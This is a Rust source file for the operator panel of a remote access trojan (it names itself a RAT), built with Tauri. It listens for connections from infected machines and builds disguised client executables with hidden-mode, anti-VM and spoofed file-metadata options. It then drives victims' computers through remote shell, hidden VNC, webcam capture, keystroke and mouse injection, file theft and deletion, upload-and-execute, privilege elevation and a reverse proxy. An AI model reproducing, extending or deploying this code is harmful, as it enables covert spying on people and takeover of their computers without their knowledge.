use crate::handlers::{AssemblyInfo, SharedTauriState};
use crate::utils::logger::Log;
use base64::{engine::general_purpose, Engine as _};
use serde::Serialize;
use std::fs;
use tauri::{State, Emitter};

use crate::client::ClientWrapper;
use crate::commands::ServerCommand;
use crate::server::ServerWrapper;
use tokio::net::TcpListener;
use tokio::sync::mpsc;
use tokio::sync::mpsc::Sender;

use std::ptr::null_mut as NULL;
use winapi::um::winuser;
use common::packets::TrollCommand;

use tauri::AppHandle;

use once_cell::sync::OnceCell;

use crate::utils::client_builder::{apply_config, apply_rcedit, open_explorer};
use common::packets::{
    KeyboardInputData, MessageBoxData, MouseClickData, Process, RemoteDesktopConfig,
    VisitWebsiteData, FileData
};
use common::client_info::ClientInfo;

use std::process::Command;

pub async fn get_channel_tx(
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<Sender<ServerCommand>, String> {
    let channel_tx = {
        let tauri_state = tauri_state.0.lock().unwrap();

        if !tauri_state.running {
            let log = Log {
                event_type: "server_error".to_string(),
                message: "Server not running!".to_string(),
            };
            let _ = app_handle
                .emit("server_log", log)
                .unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
            return Err("Server not running".to_string());
        }

        if let Some(tx) = tauri_state.channel_tx.get() {
            tx.clone()
        } else {
            let log = Log {
                event_type: "server_error".to_string(),
                message: "Server channel not initialized!".to_string(),
            };
            let _ = app_handle
                .emit("server_log", log)
                .unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
            return Err("Server channel not initialized".to_string());
        }
    };

    Ok(channel_tx)
}

pub async fn send_server_command(
    command: ServerCommand,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<(), String> {
    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;

    channel_tx
        .send(command)
        .await
        .map_err(|e| format!("Failed to send command: {}", e))?;

    Ok(())
}

#[tauri::command]
pub async fn start_server(
    port: &str,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<String, String> {
    let (ctx, crx) = mpsc::channel::<ServerCommand>(32);

    {
        let mut tauri_state = tauri_state.0.lock().unwrap();

        if tauri_state.channel_tx.set(ctx.clone()).is_err() {
            return Err("false".to_string());
        }

        tauri_state.running = true;
        tauri_state.port = port.to_string();
    };

    ctx.send(ServerCommand::SetTauriHandle(app_handle))
        .await
        .map_err(|e| format!("Failed to set Tauri handle: {}", e))?;

    let log = Log {
        event_type: "server_started".to_string(),
        message: "Server started on port ".to_string() + port,
    };
    ctx.send(ServerCommand::Log(log)).await.unwrap();

    let server_task = tokio::spawn(async move {
        match ServerWrapper::spawn(crx).await {
            Ok(_) => println!("Server started successfully"),
            Err(e) => eprintln!("Failed to start server: {}", e),
        }
    });

    let ctx_for_listener = ctx.clone();

    let port = port.parse::<u16>().unwrap();

    let listener_task = tokio::spawn(async move {
        match TcpListener::bind(("0.0.0.0", port)).await {
            Ok(listener) => loop {
                match listener.accept().await {
                    Ok((socket, addr)) => {
                        let ctx = ctx_for_listener.clone();
                        ClientWrapper::spawn(socket, addr, ctx).await;
                    }
                    Err(e) => {
                        eprintln!("Error accepting connection: {}", e);
                        break;
                    }
                }
            },
            Err(e) => {
                eprintln!("Failed to bind to port {}: {}", port, e);
            }
        }
    });

    {
        let mut tauri_state = tauri_state.0.lock().unwrap();
        tauri_state.server_task = Some(server_task);
        tauri_state.listener_task = Some(listener_task);
    }

    Ok("true".to_string())
}

#[tauri::command]
pub async fn stop_server(
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<String, String> {
    send_server_command(
        ServerCommand::CloseClientSessions(),
        tauri_state.clone(),
        app_handle,
    )
    .await?;

    {
        let mut tauri_state = tauri_state.0.lock().unwrap();

        if let Some(listener_task) = tauri_state.listener_task.take() {
            listener_task.abort();
        }

        tauri_state.channel_tx = OnceCell::new();
        tauri_state.server_task = None;
        tauri_state.listener_task = None;
        tauri_state.running = false;
    }

    Ok("true".to_string())
}

#[derive(Serialize)]
pub struct FrontRATState {
    running: bool,
    port: String,
}

#[tauri::command]
pub async fn fetch_state(
    tauri_state: State<'_, SharedTauriState>,
) -> Result<FrontRATState, FrontRATState> {
    let tauri_state = tauri_state.0.lock().unwrap();
    Ok(FrontRATState {
        running: tauri_state.running.clone(),
        port: tauri_state.port.clone(),
    })
}

#[tauri::command]
pub async fn build_client(
    ip: &str,
    port: &str,
    mutex_enabled: bool,
    mutex: &str,
    unattended_mode: bool,
    assembly_info: AssemblyInfo,
    enable_icon: bool,
    icon_path: &str,
    enable_install: bool,
    install_folder: &str,
    install_file_name: &str,
    group: &str,
    enable_hidden: bool,
    anti_vm_detection: bool,
    app_handle: AppHandle,
) -> Result<String, String> {
    let log = Log {
        event_type: "build_client".to_string(),
        message: "Building client...".to_string(),
    };
    let _ = app_handle
        .emit("server_log", log)
        .unwrap_or_else(|e| println!("Failed to emit log event: {}", e));

    let config = common::ClientConfig {
        ip: ip.to_string(),
        port: port.to_string(),
        mutex_enabled,
        mutex: mutex.to_string(),
        unattended_mode,
        group: group.to_string(),
        install: enable_install,
        file_name: install_file_name.to_string(),
        install_folder: install_folder.to_string(),
        enable_hidden,
        anti_vm_detection,
    };

    apply_config(&config).await?;

    match apply_rcedit(&assembly_info, enable_icon, icon_path).await {
        Ok(_) => {
            let log = Log {
                event_type: "build_finished".to_string(),
                message: "Client built successfully.".to_string(),
            };
            let _ = app_handle
                .emit("server_log", log)
                .unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
        }
        Err(e) => {
            let log = Log {
                event_type: "build_failed".to_string(),
                message: "Failed to build client.".to_string(),
            };
            let _ = app_handle
                .emit("server_log", log)
                .unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
            return Err(e.to_string());
        }
    }

    open_explorer("target/debug/Client_built.exe").await?;

    Ok("Client built".to_string())
}

#[tauri::command]
pub async fn fetch_clients(
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<Vec<ClientInfo>, String> {
    let (tx, rx) = tokio::sync::oneshot::channel();

    send_server_command(ServerCommand::GetClients(tx), tauri_state, app_handle).await?;

    match rx.await {
        Ok(clients) => Ok(clients),
        Err(e) => Err(format!("Failed to receive client list: {}", e)),
    }
}

#[tauri::command]
pub async fn fetch_client(
    addr: String,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<ClientInfo, String> {
    let (tx, rx) = tokio::sync::oneshot::channel();

    send_server_command(
        ServerCommand::GetClient(addr.parse().unwrap(), tx),
        tauri_state,
        app_handle,
    )
    .await?;

    match rx.await {
        Ok(Some(client)) => Ok(client),
        Ok(None) => Err(format!("Client with address {} not found", addr)),
        Err(e) => Err(format!("Failed to receive client info: {}", e)),
    }
}

#[tauri::command]
pub async fn take_screenshot(
    addr: String,
    display: i32,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<String, String> {
    send_server_command(
        ServerCommand::TakeScreenshot(addr.parse().unwrap(), display.to_string()),
        tauri_state,
        app_handle,
    )
    .await?;

    Ok("Screenshot requested".to_string())
}

#[tauri::command]
pub async fn manage_client(
    addr: String,
    run: &str,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<(), String> {
    match run {
        "disconnect" => {
            send_server_command(
                ServerCommand::DisconnectClient(addr.parse().unwrap()),
                tauri_state,
                app_handle,
            )
            .await?
        }
        "reconnect" => {
            send_server_command(
                ServerCommand::ReconnectClient(addr.parse().unwrap()),
                tauri_state,
                app_handle,
            )
            .await?
        }
        _ => {}
    }

    Ok(())
}

#[tauri::command]
pub async fn start_remote_desktop(
    addr: &str,
    display: i32,
    quality: u8,
    fps: u8,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<String, String> {
    send_server_command(
        ServerCommand::StartRemoteDesktop(
            addr.parse().unwrap(),
            RemoteDesktopConfig {
                display,
                quality,
                fps,
            },
        ),
        tauri_state,
        app_handle,
    )
    .await?;

    Ok("Remote desktop started".to_string())
}

#[tauri::command]
pub async fn stop_remote_desktop(
    addr: &str,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<String, String> {
    send_server_command(
        ServerCommand::StopRemoteDesktop(addr.parse().unwrap()),
        tauri_state,
        app_handle,
    )
    .await?;

    Ok("Remote desktop stopped".to_string())
}

#[tauri::command]
pub async fn send_mouse_click(
    addr: &str,
    display: i32,
    x: i32,
    y: i32,
    click_type: i32,
    action_type: i32,
    scroll_amount: Option<i32>,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<String, String> {
    send_server_command(
        ServerCommand::MouseClick(
            addr.parse().unwrap(),
            MouseClickData {
                display,
                x: x as i32,
                y: y as i32,
                click_type,
                action_type,
                scroll_amount: scroll_amount.unwrap_or(0),
            },
        ),
        tauri_state,
        app_handle,
    )
    .await?;

    Ok("Mouse click sent".to_string())
}

#[tauri::command]
pub async fn visit_website(
    addr: &str,
    url: &str,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<String, String> {
    send_server_command(
        ServerCommand::VisitWebsite(
            addr.parse().unwrap(),
            VisitWebsiteData {
                visit_type: "normal".to_string(),
                url: url.to_string(),
            },
        ),
        tauri_state,
        app_handle,
    )
    .await?;

    Ok("Website visited".to_string())
}

#[tauri::command]
pub fn test_messagebox(title: &str, message: &str, button: &str, icon: &str) {
    let l_msg: Vec<u16> = format!("{}\0", message).encode_utf16().collect();
    let l_title: Vec<u16> = format!("{}\0", title).encode_utf16().collect();

    unsafe {
        winuser::MessageBoxW(
            NULL(),
            l_msg.as_ptr(),
            l_title.as_ptr(),
            (match button {
                "ok" => winuser::MB_OK,
                "ok_cancel" => winuser::MB_OKCANCEL,
                "abort_retry_ignore" => winuser::MB_ABORTRETRYIGNORE,
                "yes_no_cancel" => winuser::MB_YESNOCANCEL,
                "yes_no" => winuser::MB_YESNO,
                "retry_cancel" => winuser::MB_RETRYCANCEL,
                _ => winuser::MB_OK,
            }) | (match icon {
                "info" => winuser::MB_ICONINFORMATION,
                "warning" => winuser::MB_ICONWARNING,
                "error" => winuser::MB_ICONERROR,
                "question" => winuser::MB_ICONQUESTION,
                "asterisk" => winuser::MB_ICONASTERISK,
                _ => winuser::MB_ICONINFORMATION,
            }),
        );
    }
}

#[tauri::command]
pub async fn send_messagebox(
    addr: &str,
    title: &str,
    message: &str,
    button: &str,
    icon: &str,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<String, String> {
    send_server_command(
        ServerCommand::ShowMessageBox(
            addr.parse().unwrap(),
            MessageBoxData {
                title: title.to_string(),
                message: message.to_string(),
                button: button.to_string(),
                icon: icon.to_string(),
            },
        ),
        tauri_state,
        app_handle,
    )
    .await?;

    Ok("Messagebox sent".to_string())
}

#[tauri::command]
pub async fn elevate_client(
    addr: &str,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<String, String> {
    send_server_command(
        ServerCommand::ElevateClient(addr.parse().unwrap()),
        tauri_state,
        app_handle,
    )
    .await?;

    Ok("Client elevated".to_string())
}

#[tauri::command]
pub async fn handle_system_command(
    addr: &str,
    run: &str,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<String, String> {
    send_server_command(
        ServerCommand::ManageSystem(addr.parse().unwrap(), run.to_string()),
        tauri_state,
        app_handle,
    )
    .await?;

    Ok("System command sent".to_string())
}

#[tauri::command]
pub async fn process_list(
    addr: &str,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<String, String> {
    send_server_command(
        ServerCommand::GetProcessList(addr.parse().unwrap()),
        tauri_state,
        app_handle,
    )
    .await?;

    Ok("Process list sent".to_string())
}

#[tauri::command]
pub async fn handle_process(
    addr: &str,
    run: &str,
    pid: i32,
    name: &str,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<String, String> {
    let cmd = Process {
        pid: pid as usize,
        name: name.to_string(),
    };

    let cmd = match run {
        "suspend" => ServerCommand::SuspendProcess(addr.parse().unwrap(), cmd),
        "resume" => ServerCommand::ResumeProcess(addr.parse().unwrap(), cmd),
        _ => return Err("Invalid command".to_string()),
    };

    send_server_command(cmd, tauri_state, app_handle).await?;

    Ok("Process command sent".to_string())
}

#[tauri::command]
pub async fn start_process(
    addr: &str,
    name: &str,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<String, String> {
    send_server_command(
        ServerCommand::StartProcess(addr.parse().unwrap(), name.to_string()),
        tauri_state,
        app_handle,
    )
    .await?;

    Ok("Process started".to_string())
}

#[tauri::command]
pub async fn kill_process(
    addr: &str,
    pid: i32,
    name: &str,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<String, String> {
    send_server_command(
        ServerCommand::KillProcess(
            addr.parse().unwrap(),
            Process {
                pid: pid as usize,
                name: name.to_string(),
            },
        ),
        tauri_state,
        app_handle,
    )
    .await?;

    Ok("Process killed".to_string())
}

#[tauri::command]
pub async fn manage_shell(
    addr: &str,
    run: &str,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<String, String> {
    match run {
        "start" => {
            send_server_command(
                ServerCommand::StartShell(addr.parse().unwrap()),
                tauri_state,
                app_handle,
            )
            .await?
        }
        "stop" => {
            send_server_command(
                ServerCommand::ExitShell(addr.parse().unwrap()),
                tauri_state,
                app_handle,
            )
            .await?
        }
        _ => {}
    }

    Ok("Shell command sent".to_string())
}

#[tauri::command]
pub async fn execute_shell_command(
    addr: &str,
    run: &str,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<String, String> {
    send_server_command(
        ServerCommand::ShellCommand(addr.parse().unwrap(), run.to_string()),
        tauri_state,
        app_handle,
    )
    .await?;

    Ok("Shell command sent".to_string())
}

#[tauri::command]
pub async fn read_files(
    addr: &str,
    run: &str,
    path: &str,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<String, String> {
    match run {
        "previous_dir" => {
            send_server_command(
                ServerCommand::PreviousDir(addr.parse().unwrap()),
                tauri_state,
                app_handle,
            )
            .await?
        }
        "view_dir" => {
            send_server_command(
                ServerCommand::ViewDir(addr.parse().unwrap(), path.to_string()),
                tauri_state,
                app_handle,
            )
            .await?
        }
        "available_disks" => {
            send_server_command(
                ServerCommand::AvailableDisks(addr.parse().unwrap()),
                tauri_state,
                app_handle,
            )
            .await?
        }
        _ => {}
    }

    Ok("File operation sent".to_string())
}

#[tauri::command]
pub async fn manage_file(
    addr: &str,
    run: &str,
    file: &str,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<String, String> {
    match run {
        "download_file" => {
            send_server_command(
                ServerCommand::DownloadFile(addr.parse().unwrap(), file.to_string()),
                tauri_state,
                app_handle,
            )
            .await?
        }
        "remove_file" => {
            send_server_command(
                ServerCommand::RemoveFile(addr.parse().unwrap(), file.to_string()),
                tauri_state,
                app_handle,
            )
            .await?
        }
        "remove_dir" => {
            send_server_command(
                ServerCommand::RemoveDir(addr.parse().unwrap(), file.to_string()),
                tauri_state,
                app_handle,
            )
            .await?
        }
        _ => {}
    }

    Ok("File operation sent".to_string())
}

#[tauri::command]
pub async fn start_reverse_proxy(
    addr: &str,
    port: &str,
    localport: &str,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<String, String> {
    send_server_command(
        ServerCommand::StartReverseProxy(
            addr.parse().unwrap(),
            port.to_string(),
            localport.to_string(),
        ),
        tauri_state,
        app_handle,
    )
    .await?;

    Ok("Reverse proxy started".to_string())
}

#[tauri::command]
pub async fn stop_reverse_proxy(
    addr: &str,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<String, String> {
    send_server_command(
        ServerCommand::StopReverseProxy(addr.parse().unwrap()),
        tauri_state,
        app_handle,
    )
    .await?;

    Ok("Reverse proxy stopped".to_string())
}

#[tauri::command]
pub async fn read_icon(path: &str, _app_handle: AppHandle) -> Result<String, String> {
    let icon = fs::read(path).map_err(|e| format!("Failed to read icon: {}", e))?;

    let base64_icon = general_purpose::STANDARD.encode(&icon);

    Ok(base64_icon)
}

#[tauri::command]
pub async fn read_exe(path: &str) -> Result<AssemblyInfo, String> {
    let _ = fs::read(path).map_err(|e| format!("Failed to read exe: {}", e))?;

    let info = get_assembly_info(path, "target/rcedit.exe").unwrap();

    Ok(info)
}

pub fn get_assembly_info(exe_path: &str, rcedit_path: &str) -> Result<AssemblyInfo, String> {
    // Helper closure to get a value or return empty string on failure
    let get_value = |key: &str| -> String {
        let output = Command::new(rcedit_path)
            .arg(exe_path)
            .arg("--get-version-string")
            .arg(key)
            .output();

        match output {
            Ok(out) if out.status.success() => {
                String::from_utf8_lossy(&out.stdout).trim().to_string()
            }
            Ok(out) => {
                let err = String::from_utf8_lossy(&out.stderr);
                eprintln!("Failed to get {}: {}", key, err.trim());
                String::new()
            }
            Err(e) => {
                eprintln!("Command error for {}: {}", key, e);
                String::new()
            }
        }
    };

    Ok(AssemblyInfo {
        assembly_name: get_value("ProductName"),
        assembly_description: get_value("FileDescription"),
        assembly_company: get_value("CompanyName"),
        assembly_copyright: get_value("LegalCopyright"),
        assembly_trademarks: get_value("LegalTrademarks"),
        assembly_original_filename: get_value("OriginalFilename"),
        assembly_product_version: get_value("ProductVersion"),
        assembly_file_version: get_value("FileVersion"),
    })
}

#[tauri::command]
pub async fn send_keyboard_input(
    addr: &str,
    key_code: u32,
    character: &str,
    is_keydown: bool,
    shift_pressed: bool,
    ctrl_pressed: bool,
    caps_lock: bool,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<String, String> {
    send_server_command(
        ServerCommand::KeyboardInput(
            addr.parse().unwrap(),
            KeyboardInputData {
                key_code,
                character: character.to_string(),
                is_keydown,
                shift_pressed,
                ctrl_pressed,
                caps_lock,
            },
        ),
        tauri_state,
        app_handle,
    )
    .await?;

    Ok("Keyboard input sent".to_string())
}

#[tauri::command]
pub async fn request_webcam(
    addr: &str,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<String, String> {
    send_server_command(
        ServerCommand::RequestWebcam(addr.parse().unwrap()),
        tauri_state,
        app_handle,
    )
    .await?;

    Ok("Webcam request sent".to_string())
}

#[tauri::command]
pub async fn manage_hvnc(
    addr: &str,
    run: &str,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<String, String> {
    match run {
        "start" => {
            send_server_command(
                ServerCommand::StartHVNC(addr.parse().unwrap()),
                tauri_state,
                app_handle,
            )
            .await?
        }
        "stop" => {
            send_server_command(
                ServerCommand::StopHVNC(addr.parse().unwrap()),
                tauri_state,
                app_handle,
            )
            .await?
        }
        "open_explorer" => {
            send_server_command(
                ServerCommand::OpenExplorer(addr.parse().unwrap()),
                tauri_state,
                app_handle,
            )
            .await?
        }
        _ => {}
    }
    Ok("HVNC command sent".to_string())
}

#[tauri::command]
pub async fn upload_and_execute(
    addr: &str,
    file_path: &str,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle
) -> Result<String, String> {
    // Read the file from disk
    let file_data = fs::read(file_path)
        .map_err(|e| format!("Failed to read file: {}", e))?;
    
    // Get the filename from the path
    let file_name = std::path::Path::new(file_path)
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or("unknown.exe");
    
    // Create FileData struct
    let file_data = FileData {
        name: file_name.to_string(),
        data: file_data,
    };
    
    send_server_command(ServerCommand::UploadAndExecute(addr.parse().unwrap(), file_data), tauri_state, app_handle).await?;

    Ok("Upload and execute command sent".to_string())
}

#[tauri::command]
pub async fn execute_file(
    addr: &str,
    file_path: &str,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle
) -> Result<String, String> {
    send_server_command(ServerCommand::ExecuteFile(addr.parse().unwrap(), file_path.to_string()), tauri_state, app_handle).await?;

    Ok("Execute file command sent".to_string())
}

#[tauri::command]
pub async fn read_file_for_upload(file_path: &str) -> Result<Vec<u8>, String> {
    fs::read(file_path)
        .map_err(|e| format!("Failed to read file: {}", e))
}

#[tauri::command]
pub async fn upload_file_to_folder(
    addr: &str,
    target_folder: &str,
    file_name: &str,
    file_data: Vec<u8>,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle
) -> Result<String, String> {
    let file_data = FileData {
        name: file_name.to_string(),
        data: file_data,
    };
    
    send_server_command(ServerCommand::UploadFile(addr.parse().unwrap(), target_folder.to_string(), file_data), tauri_state, app_handle).await?;

    Ok("File upload command sent".to_string())
}

#[tauri::command]
pub async fn send_troll_command(
    addr: &str,
    command: TrollCommand,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<String, String> {
    send_server_command(
        ServerCommand::HandleTroll(addr.parse().unwrap(), command),
        tauri_state,
        app_handle,
    )
    .await?;

    Ok("Troll command sent".to_string())
}
